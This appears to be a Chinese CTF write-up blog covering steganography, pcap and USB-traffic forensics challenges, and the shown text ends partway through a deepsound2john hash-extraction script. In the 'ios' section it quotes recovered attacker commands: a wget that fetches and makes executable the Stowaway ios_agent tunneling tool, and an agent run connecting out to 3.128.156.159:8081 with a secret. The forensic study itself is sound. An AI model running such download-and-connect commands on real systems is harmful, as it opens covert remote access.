        <content type="html"><![CDATA[<h3 id="UTCTF-2020-Zero"><a href="#UTCTF-2020-Zero" class="headerlink" title="[UTCTF 2020]Zero"></a>[UTCTF 2020]Zero</h3><p>得到附件打开得到</p><p>Lorem ipsum dolor ‌‌‌‌‍﻿‍‍sit amet‌‌‌‌‍﻿‍‌, consectetur adipiscing‌‌‌‌‍‬‍‬ elit.‌‌‌‌‍‬﻿‌‌‌‌‌‍‬‌‍ Phasellus quis tempus ante, nec vehicula mi. ‌‌‌‌‍‬‍﻿Aliquam nec‌‌‌‌‍﻿‬﻿ nisi ut neque interdum auctor.‌‌‌‌‍﻿‍﻿ Aliquam felis ‌‌‌‌‍‬‬‌orci, vestibulum ‌‌‌‌‍﻿‬‍sit amet ante‌‌‌‌‍‌﻿‬ at, consectetur‌‌‌‌‍‌﻿﻿ lobortis eros.‌‌‌‌‍‍‍‌ ‌‌‌‌‍‌‌‌Orci varius natoque ‌‌‌‌‍﻿‌﻿penatibus et ‌‌‌‌‍‬‌﻿magnis‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‍ dis ‌‌‌‌‍‍﻿﻿parturient montes, nascetur ridiculus ‌‌‌‌‌﻿‍‌‌‌‌‌‌﻿‬‍mus. In finibus‌‌‌‌‌﻿‌‬ magna‌‌‌‌‌﻿‍﻿ mauris, quis‌‌‌‌‍‬‌‍ auctor ‌‌‌‌‍‬‌‍libero congue quis. ‌‌‌‌‍‬‬‬Duis‌‌‌‌‍‬‌‬ sagittis consequat urna non tristique. Pellentesque eu lorem ‌‌‌‌‍﻿‌‍id‌‌‌‌‍‬‬﻿ quam vestibulum ultricies vel ac purus‌‌‌‌‌﻿‌‍.‌‌‌‌‌﻿‍‌‌‌‌‌‍﻿﻿‍﻿</p><p>放在kali里面，用vim打开该txt文件，果然发现许多不可见字符，就判断为零宽字符，在线解密得到flag。</p><h3 id="NISACTF-2022-为什么我什么都看不见"><a href="#NISACTF-2022-为什么我什么都看不见" class="headerlink" title="[NISACTF 2022]为什么我什么都看不见"></a>[NISACTF 2022]为什么我什么都看不见</h3><p>打开附件后，放到010中发现文件头出现错误，补齐文件头。先用binwalk分析，得到rar文件，却什么都没有，后来分析，发现是；lsb隐写，最低位隐写即可。</p><h3 id="LitCTF-2023-两仪生四象-中级"><a href="#LitCTF-2023-两仪生四象-中级" class="headerlink" title="[LitCTF 2023]两仪生四象 (中级)"></a>[LitCTF 2023]两仪生四象 (中级)</h3><p>题目直接给了一个程序。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py">_<span class="hljs-built_in">hash</span> = &#123;<span class="hljs-string">&quot;乾&quot;</span>: <span class="hljs-string">&quot;111&quot;</span>, <span class="hljs-string">&quot;兑&quot;</span>: <span class="hljs-string">&quot;011&quot;</span>, <span class="hljs-string">&quot;离&quot;</span>: <span class="hljs-string">&quot;101&quot;</span>, <span class="hljs-string">&quot;震&quot;</span>: <span class="hljs-string">&quot;001&quot;</span>, <span class="hljs-string">&quot;巽&quot;</span>: <span class="hljs-string">&quot;110&quot;</span>, <span class="hljs-string">&quot;坎&quot;</span>: <span class="hljs-string">&quot;010&quot;</span>, <span class="hljs-string">&quot;艮&quot;</span>: <span class="hljs-string">&quot;100&quot;</span>, <span class="hljs-string">&quot;坤&quot;</span>: <span class="hljs-string">&quot;000&quot;</span>&#125;<br><br>_reverse_hash = &#123;v: k <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> _<span class="hljs-built_in">hash</span>.items()&#125;<br><br>text = <span class="hljs-string">&quot;LitCTF&#123;*********&#125;&quot;</span><br><br>text = text[<span class="hljs-number">7</span>:-<span class="hljs-number">1</span>]<br><br>binary_text = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(c), <span class="hljs-string">&#x27;010b&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> text)<span class="hljs-comment">#format(ord(c), &#x27;010b&#x27;) 的作用是将它的ASCII码转换成8位二进制数字，前面加零以保证每个二进制数字的长度都是3位。然后，使用&#x27;&#x27;.join()将所有二进制数字连接在一起，以获得整个字符串的二进制编码表示。</span><br><br>encoded_text = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_text), <span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">try</span>:<br>        encoded_text += _reverse_hash[binary_text[i:i + <span class="hljs-number">3</span>]]<br>    <span class="hljs-keyword">except</span> KeyError:<br>        encoded_text += <span class="hljs-string">&quot; &quot;</span><br><br><span class="hljs-built_in">print</span>(encoded_text)<br><br><span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">encoded_text = &quot;坤乾兑艮兑坎坤坤巽震坤巽震艮兑坎坤震兑乾坤巽坤艮兑震巽坤巽艮坤巽艮艮兑兑艮震兑乾坤乾坤坤兑艮艮坤巽坤坤巽坎坤兑离坎震艮兑坤巽坎艮兑震坤震兑乾坤乾坎坤兑坎坤震艮离坤离乾艮震艮巽震离震坤巽兑艮兑坎坤震巽艮坤离乾艮坎离坤震巽坎坤兑坤艮兑震巽震巽坎坤巽坤艮兑兑坎震巽兑&quot; </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p>这段代码是对二进制字符串进行解码的过程。在循环中，每次处理三个字符，也就是一个汉字对应的三个二进制数字。如果这三个数字是有效的，即它们对应的八卦名称在_reverse_hash字典中有定义，那么就将这个八卦名称添加到已解密的字符串Encoded_text中；否则，就添加一个空格。</p><p>这个过程中使用了异常处理机制。如果一个二进制字符串无法找到相应的八卦名称，_reverse_hash[binary_text[i:i+3]]操作将会引发一个KeyError异常。在这种情况下，程序将在字符串encoded_text中添加一个空格，以便在最终解密结果中保留二进制字符串中无法解密的部分位置，并且不会中断整个程序的执行。</p><p>最终，经过循环处理和异常处理，我们就可以获得解密后的明文字符串，它被存储在encoded_text变量中。</p><p>脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py">_<span class="hljs-built_in">hash</span> = &#123;<span class="hljs-string">&quot;乾&quot;</span>: <span class="hljs-string">&quot;111&quot;</span>, <span class="hljs-string">&quot;兑&quot;</span>: <span class="hljs-string">&quot;011&quot;</span>, <span class="hljs-string">&quot;离&quot;</span>: <span class="hljs-string">&quot;101&quot;</span>, <span class="hljs-string">&quot;震&quot;</span>: <span class="hljs-string">&quot;001&quot;</span>, <span class="hljs-string">&quot;巽&quot;</span>: <span class="hljs-string">&quot;110&quot;</span>, <span class="hljs-string">&quot;坎&quot;</span>: <span class="hljs-string">&quot;010&quot;</span>, <span class="hljs-string">&quot;艮&quot;</span>: <span class="hljs-string">&quot;100&quot;</span>, <span class="hljs-string">&quot;坤&quot;</span>: <span class="hljs-string">&quot;000&quot;</span>&#125;<br><br>encoded_text = <span class="hljs-string">&quot;坤乾兑艮兑坎坤坤巽震坤巽震艮兑坎坤震兑乾坤巽坤艮兑震巽坤巽艮坤巽艮艮兑兑艮震兑乾坤乾坤坤兑艮艮坤巽坤坤巽坎坤兑离坎震艮兑坤巽坎艮兑震坤震兑乾坤乾坎坤兑坎坤震艮离坤离乾艮震艮巽震离震坤巽兑艮兑坎坤震巽艮坤离乾艮坎离坤震巽坎坤兑坤艮兑震巽震巽坎坤巽坤艮兑兑坎震巽兑&quot;</span><br>text = <span class="hljs-string">&#x27;&#x27;</span><br>binary_text = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> encoded_text:<br>    binary_text += _<span class="hljs-built_in">hash</span>[char]<br>formatted_binary_text = <span class="hljs-string">&quot; &quot;</span>.join(binary_text[i:i+<span class="hljs-number">10</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_text), <span class="hljs-number">10</span>))<br><br><span class="hljs-built_in">print</span>(formatted_binary_text)<br><span class="hljs-comment"># 0001110111 0001101000 0000110001 0001100011 0001101000 0001011111 0001100001 0001100111 0000110100 0001101001 0001101110 0001011111 0001110000 0001110010 0000110000 0001100100 0001110101 0001100011 0001100101 0001100100 0001011111 0001110100 0001101000 0001100101 0001011111 0000110011 0001101001 0001100111 0001101000 0001110100 0001011111 0001010100 0001110010 0000110001 0001100111 0001110010 0001100001 0001101101 0001110011</span><br></code></pre></td></tr></table></figure><p>这段代码是对二进制字符串进行解码的过程。在循环中，每次处理三个字符，也就是一个汉字对应的三个二进制数字。如果这三个数字是有效的，即它们对应的八卦名称在_reverse_hash字典中有定义，那么就将这个八卦名称添加到已解密的字符串Encoded_text中；否则，就添加一个空格。</p><p>这个过程中使用了异常处理机制。如果一个二进制字符串无法找到相应的八卦名称，_reverse_hash[binary_text[i:i+3]]操作将会引发一个KeyError异常。在这种情况下，程序将在字符串encoded_text中添加一个空格，以便在最终解密结果中保留二进制字符串中无法解密的部分位置，并且不会中断整个程序的执行。</p><p>最终，经过循环处理和异常处理，我们就可以获得解密后的明文字符串，它被存储在encoded_text变量中。</p><p>然后再进行二进制转字符串即可得到flag。</p><h3 id="【攻防世界】适合作为桌面"><a href="#【攻防世界】适合作为桌面" class="headerlink" title="【攻防世界】适合作为桌面"></a>【攻防世界】适合作为桌面</h3><p>binwalk发现zlib但是没有任何用处。</p><p>在stegslove中发现一张图片</p><p>扫码得到</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">03</spanspan class="hljs-number">07300000000</span><br></code></pre></td></tr></table></figure><p>16进制在winhex进制中转换发现具有乱码，但是其中有 1.py和module猜测为pyc文件反编译。</p><p><a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a></p><p>解密得到python文件，进行调整得到</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 2.7</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-built_in">str</span> = [<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">123</span>,<span class="hljs-number">51</span>,<span class="hljs-number">56</span>,<span class="hljs-number">97</span>,<span class="hljs-number">53</span>,<span class="hljs-number">55</span>,<span class="hljs-number">48</span>,<span class="hljs-number">51</span>,<span class="hljs-number">50</span>,<span class="hljs-number">48</span>,<span class="hljs-number">56</span>,<span class="hljs-number">53</span>,<span class="hljs-number">52</span>,<span class="hljs-number">52</span>,<span class="hljs-number">49</span>,<span class="hljs-number">101</span>,<span class="hljs-number">55</span>,<span class="hljs-number">125</span>,]<br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        flag += <span class="hljs-built_in">chr</span>(i)<br>    <span class="hljs-built_in">print</span>(flag)<br><br>flag()<span class="hljs-comment">#flag&#123;38a57032085441e7&#125;</span><br></code></pre></td></tr></table></figure><h3 id="LitCTF-2023-Take-me-hand-初级"><a href="#LitCTF-2023-Take-me-hand-初级" class="headerlink" title="[LitCTF 2023]Take me hand (初级)"></a>[LitCTF 2023]Take me hand (初级)</h3><p>打开流量包<br>首先搜一遍词条，flag，ctf，分组详情，分组列表，分组字节流。<br>在分组字节流里找到flag</p><p>%21经url转换为！%7B,%7D分别为{ }，可得flag</p><h3 id="攻防世界-Cephalopod"><a href="#攻防世界-Cephalopod" class="headerlink" title="攻防世界 Cephalopod"></a>攻防世界 Cephalopod</h3><p>追踪流量包的tcp发现了png文件，放在binwalk以及foremost无法分离，利用</p><p>tcpxtract -f 434c8c0ba659476caa9635b97f95600c.pcap</p><p>提取得到flag。</p><p>也可以在tcp追踪流中复制原始数据，到010中进行还原得到png图片。</p><p>给了一个usbdata经过分析为usb流量</p><p>利用脚本进行提取得到</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> UsbKeyboardDataHacker.<span class="hljs-keyword">py</span> usbdata.pcap<br></code></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">ujkonjk,</span>tfvbhyhjipokrdcvgrdcvgpokqwsztfvbhujkowazxdqasewsdrpokxdfviklpnjkwsdrrfgyrdcvguhnmkbhjmyhji<br></code></pre></td></tr></table></figure><p>应该是键盘密码</p><p>键盘上 ujko 四个字符把 i 包围起来<br>njk 把 m 围起来<br>tfvbh 中间的是 g<br>yhji 围得是 u<br>则：<br>i m g u l f f l a g i s w e l c o m e t f j n u<br>分一下：<br>im gulf flag is welcome t fjnu</p><p>由于flag是残缺的则补齐 to</p><p>NSSCTF{welcome_to_fjnu}</p><h3 id="NISACTF-2022-流量包里有个熊"><a href="#NISACTF-2022-流量包里有个熊" class="headerlink" title="[NISACTF 2022]流量包里有个熊"></a>[NISACTF 2022]流量包里有个熊</h3><p>添加pcap，导出http得到一张小熊的图片，放在binwalk中进行分析发现隐藏文件分离得到</p><p>flag.txt有一个base解密得到</p><p>this is not the true flag!</p><p>打开rar文件发现两个 flah文件外面的没用打开里面的发现一堆奇怪的字符，rot13后发现似乎是图片的16进制放在010中打开得到图片。</p><p>发现了可能是盲水印，利用工具打开</p><p>即 NSSCTF{S0_clev2l_You}</p><h3 id="陇剑杯-2021-ios"><a href="#陇剑杯-2021-ios" class="headerlink" title="[陇剑杯 2021]ios"></a>[陇剑杯 2021]ios</h3><h5 id="（1）"><a href="#（1）" class="headerlink" title="（1）"></a>（1）</h5><p>追踪TCP流得到15字节里的日志。</p><p>发现  hack4sec。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">testiphonex</span>:~ root# ./ios_agent -c <span class="hljs-number">3.128.156.159:8081</span> -s hack4sec<br><span class="hljs-attribute">2021</span>/<span class="hljs-number">08</span>/<span class="hljs-number">28</span> <span class="hljs-number">17</span>:<span class="hljs-number">53</span>:<span class="hljs-number">50</span><span class="hljs-meta"> [*] Starting agent node actively.Connecting to 3.128.156.159:8081</span><br><span class="hljs-meta"></span><br></code></pre></td></tr></table></figure><p>可知ip地址为 3.128.156.159</p><h5 id="（2"><a href="#（2" class="headerlink" title="（2)"></a>（2)</h5><p>发现GitHub开源网站：</p><p> Stowaway</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ph4ntonn/</span>Stowaway<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/1.6.2/i</span>os_agent &amp;&amp; chmod <span class="hljs-number">755</span> ios_agent<br></code></pre></td></tr></table></figure><p>作者名：　ph4ntonn  </p><p>项目名：　Stowaway </p><p>软件名　     ios_agent</p><h5 id="（3）"><a href="#（3）" class="headerlink" title="（3）"></a>（3）</h5><p>（1）中得出密钥： hack4sec</p><h5 id="（4）"><a href="#（4）" class="headerlink" title="（4）"></a>（4）</h5><p>这里需要先对TLS数据流进行解密</p><p>首选项，TLS 选择keylog.txt</p><p>数据流过滤为http2,然后对数据流进行盲注分析</p><p>37 34 36 35 35 38 66 33 2D 63 38 34 31 2D 34 35 36 62 2D 38 35 64 37 2D 64 36 63 30 66 32 65 64 61 62 62 32 5A 5A 5A 6A</p><p>hex转字符串  746558f3-c841-456b-85d7-d6c0f2edabb2</p><h3 id="CISCN-2022-初赛-ez-usb"><a href="#CISCN-2022-初赛-ez-usb" class="headerlink" title="[CISCN 2022 初赛]ez_usb"></a>[CISCN 2022 初赛]ez_usb</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">tshark -r <span class="hljs-string">&quot;C:\Users\86157\Desktop\新建文件夹\新建文件夹\ez_usb.pcapng&quot;</span> -Y <span class="hljs-string">&#x27;usb.data_len == 8&#x27;</span> -Y <span class="hljs-string">&#x27;usb.src ==&quot;2.10.1&quot;&#x27;</span> -T fields -e usbhid.data &gt; <span class="hljs-number">3.</span>txt<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">tshark -r <span class="hljs-string">&quot;C:\Users\86157\Desktop\新建文件夹\新建文件夹\ez_usb.pcapng&quot;</span> -Y <span class="hljs-string">&#x27;usb.data_len == 8&#x27;</span> -Y <span class="hljs-string">&#x27;usb.src ==&quot;2.8.1&quot;&#x27;</span> -T fields -e usbhid.data &gt; <span class="hljs-number">1.</span>txt<br></code></pre></td></tr></table></figure><h3 id="CISCN-2022-初赛-babydisk"><a href="#CISCN-2022-初赛-babydisk" class="headerlink" title="[CISCN 2022 初赛]babydisk"></a>[CISCN 2022 初赛]babydisk</h3><p>打开后获得一个wav文件。经过提示，使用deepsound</p><p>发现需要密码，则确定是deepsound隐写</p><p>从网上找到一个脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">deepsound2john extracts password hashes from audio files containing encrypted</span><br><span class="hljs-string">data steganographically embedded by DeepSound (http://jpinsoft.net/deepsound/).</span><br><span class="hljs-string">This method is known to work with files created by DeepSound 2.0.</span><br><span class="hljs-string">Input files should be in .wav format. Hashes can be recovered from audio files</span><br><span class="hljs-string">even after conversion from other formats, e.g.,</span><br><span class="hljs-string">    ffmpeg -i input output.wav</span><br><span class="hljs-string">Usage:</span><br><span class="hljs-string">    python3 deepsound2john.py carrier.wav &gt; hashes.txt</span><br><span class="hljs-string">    john hashes.txt</span><br><span class="hljs-string">This software is copyright (c) 2018 Ryan Govostes &lt;rgovostes@gmail.com&gt;, and</span><br><span class="hljs-string">it is hereby released to the general public under the following terms:</span><br><span class="hljs-string">Redistribution and use in source and binary forms, with or without</span><br><span class="hljs-string">modification, are permitted.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br> <br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> textwrap<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_data_low</span>(<span class="hljs-params">buf</span>):<br>  <span class="hljs-keyword">return</span> buf[::<span class="hljs-number">2</span>]<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_data_normal</span>(<span class="hljs-params">buf</span>):<br>  out = <span class="hljs-built_in">bytearray</span>()<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(buf), <span class="hljs-number">4</span>):<br>    out.append((buf[i] &amp; <span class="hljs-number">15</span>) &lt;&lt; <span class="hljs-number">4</span> | (buf[i + <span class="hljs-number">2</span>] &amp; <span class="hljs-number">15</span>))<br>  <span class="hljs-keyword">return</span> out<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_data_high</span>(<span class="hljs-params">buf</span>):<br>  out = <span class="hljs-built_in">bytearray</span>()<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(buf), <span class="hljs-number">8</span>):<br>    out.append((buf[i] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">6</span>     | (buf[i + <span class="hljs-number">2</span>] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">4</span> \<br>             | (buf[i + <span class="hljs-number">4</span>] &amp; <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">2</span> | (buf[i + <span class="hljs-number">6</span>] &amp; <span class="hljs-number">3</span>))<br>  <span class="hljs-keyword">return</span> out<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_magic</span>(<span class="hljs-params">buf</span>):<br>  <span class="hljs-comment"># This is a more efficient way of testing for the `DSCF` magic header without</span><br>  <span class="hljs-comment"># decoding the whole buffer</span><br>  <span class="hljs-keyword">return</span> (buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">15</span>)  == (<span class="hljs-number">68</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">2</span>]  &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">68</span> &amp; <span class="hljs-number">15</span>) \<br>     <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">4</span>] &amp; <span class="hljs-number">15</span>)  == (<span class="hljs-number">83</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">6</span>]  &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">83</span> &amp; <span class="hljs-number">15</span>) \<br>     <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">8</span>] &amp; <span class="hljs-number">15</span>)  == (<span class="hljs-number">67</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">10</span>] &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">67</span> &amp; <span class="hljs-number">15</span>) \<br>     <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">12</span>] &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">70</span> &gt;&gt; <span class="hljs-number">4</span>) <span class="hljs-keyword">and</span> (buf[<span class="hljs-number">14</span>] &amp; <span class="hljs-number">15</span>) == (<span class="hljs-number">70</span> &amp; <span class="hljs-number">15</span>)<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_wave</span>(<span class="hljs-params">buf</span>):<br>  <span class="hljs-keyword">return</span> buf[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">b&#x27;RIFF&#x27;</span> <span class="hljs-keyword">and</span> buf[<span class="hljs-number">8</span>:<span class="hljs-number">12</span>] == <span class="hljs-string">b&#x27;WAVE&#x27;</span><br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_deepsound_file</span>(<span class="hljs-params">f</span>):<br>  bname = os.path.basename(f.name)<br>  logger = logging.getLogger(bname)<br> <br>  <span class="hljs-comment"># Check if it&#x27;s a .wav file</span><br>  buf = f.read(<span class="hljs-number">12</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_wave(buf):<br>    <span class="hljs-keyword">global</span> convert_warn<br>    logger.error(<span class="hljs-string">&#x27;file not in .wav format&#x27;</span>)<br>    convert_warn = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span><br>  f.seek(<span class="hljs-number">0</span>, os.SEEK_SET)<br> <br>  <span class="hljs-comment"># Scan for the marker...</span><br>  hdrsz = <span class="hljs-number">104</span><br>  hdr = <span class="hljs-literal">None</span><br> <br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    off = f.tell()<br>    buf = f.read(hdrsz)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(buf) &lt; hdrsz: <span class="hljs-keyword">break</span><br> <br>    <span class="hljs-keyword">if</span> is_magic(buf):<br>          hdr = decode_data_normal(buf)<br>          logger.info(<span class="hljs-string">&#x27;found DeepSound header at offset %i&#x27;</span>, off)<br>          <span class="hljs-keyword">break</span><br> <br>    f.seek(-hdrsz + <span class="hljs-number">1</span>, os.SEEK_CUR)<br> <br>  <span class="hljs-keyword">if</span> hdr <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    logger.warn(<span class="hljs-string">&#x27;does not appear to be a DeepSound file&#x27;</span>)<br>    <span class="hljs-keyword">return</span><br> <br>  <span class="hljs-comment"># Check some header fields</span><br>  mode = hdr[<span class="hljs-number">4</span>]<br>  encrypted = hdr[<span class="hljs-number">5</span>]<br> <br>  modes = &#123;<span class="hljs-number">2</span>: <span class="hljs-string">&#x27;low&#x27;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&#x27;normal&#x27;</span>, <span class="hljs-number">8</span>: <span class="hljs-string">&#x27;high&#x27;</span>&#125;<br>  <span class="hljs-keyword">if</span> mode <span class="hljs-keyword">in</span> modes:<br>    logger.info(<span class="hljs-string">&#x27;data is encoded in %s-quality mode&#x27;</span>, modes[mode])<br>  <span class="hljs-keyword">else</span>:<br>    logger.error(<span class="hljs-string">&#x27;unexpected data encoding mode %i&#x27;</span>, modes[mode])<br>    <span class="hljs-keyword">return</span><br> <br>  <span class="hljs-keyword">if</span> encrypted == <span class="hljs-number">0</span>:<br>    logger.warn(<span class="hljs-string">&#x27;file is not encrypted&#x27;</span>)<br>    <span class="hljs-keyword">return</span><br>  <span class="hljs-keyword">elif</span> encrypted != <span class="hljs-number">1</span>:<br>    logger.error(<span class="hljs-string">&#x27;unexpected encryption flag %i&#x27;</span>, encrypted)<br>    <span class="hljs-keyword">return</span><br> <br>  sha1 = hdr[<span class="hljs-number">6</span>:<span class="hljs-number">6</span>+<span class="hljs-number">20</span>]<br>  <span 